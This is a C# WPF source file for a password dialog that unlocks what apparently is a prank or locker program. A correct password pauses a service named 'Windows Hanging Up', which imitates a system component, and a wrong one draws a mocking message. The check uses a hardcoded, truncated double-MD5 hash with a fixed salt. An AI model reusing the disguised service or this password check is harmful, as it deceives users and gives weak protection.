using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Windows;
using Application = System.Windows.Application;
using MessageBox = System.Windows.Forms.MessageBox;

namespace UnlockWarning;

public partial class AskForPassword : Window
{
    public static string GetMd5_16(string input)
    {
        using (MD5 md5 = MD5.Create())
        {
            byte[] buffer = Encoding.UTF8.GetBytes(input);
            byte[] hashBytes = md5.ComputeHash(buffer);
            // 取中间 8~24 位（即 16 个字符）
            string md5_16 = BitConverter.ToString(hashBytes, 4, 8)
                .Replace("-", "")
                .ToLower();
            return md5_16;
        }
    }
    private static string password = "9cac80bc40861343";
    public AskForPassword()
    {
        InitializeComponent();
    }

    private void button1_Click(object sender, RoutedEventArgs e)
    {
        string getPassword = textBox1.Text;
        string md5_password = GetMd5_16(GetMd5_16(getPassword) + "qnmdzhr");
        if (md5_password == password)
        {
            MessageBox.Show("你过关");
            Utility.PauseService("Windows Hanging Up");
            Application.Current.Dispatcher.Invoke(() => Application.Current.Shutdown());
        }
        else
        {
            MessageBox.Show("密码错了，哈哈");
        }
    }
}